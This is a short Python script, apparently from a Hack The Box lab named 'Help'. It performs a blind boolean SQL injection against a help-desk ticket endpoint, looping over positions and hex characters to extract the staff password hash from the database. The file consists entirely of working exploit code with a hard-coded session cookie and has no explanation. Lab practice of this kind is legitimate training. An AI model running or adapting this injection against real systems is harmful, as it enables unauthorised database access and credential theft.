# htb help exploit

import requests
import logging

# disable missing TLS warnings
logging.captureWarnings(True)

headers = {
    "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Cookie": "PHPSESSID=8unp7qoifpi86nqqbfop45eme5",
    "usrhash":r"0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BEUuci3mUd88NS4pBenaBfX5WnaqGUo8E5uJR4RpRR94A%3D%3D"
}

password = ""
for i in range(1,41):
    for j in [format(i, 'x') for i in range(16)]:
        response = requests.get(f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=6&param[]=attachment&param[]=2&param[]=8+AND+SUBSTRING((SELECT+Password+FROM+staff),+{i},+1)+=+'{str(j)}'+--+-", verify=False, headers=headers)
        if "find" not in response.text:
            password += str(j)
            print(password)
            break

print(password)
